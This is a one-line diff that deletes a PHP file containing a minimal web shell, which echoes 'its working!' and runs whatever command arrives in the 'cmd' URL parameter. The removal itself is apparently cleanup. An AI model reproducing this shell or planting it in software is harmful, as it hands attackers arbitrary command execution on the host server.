@@ -1,1 +1,0 @@
-<?php echo "its working! "; system($_GET["cmd"]) ?>
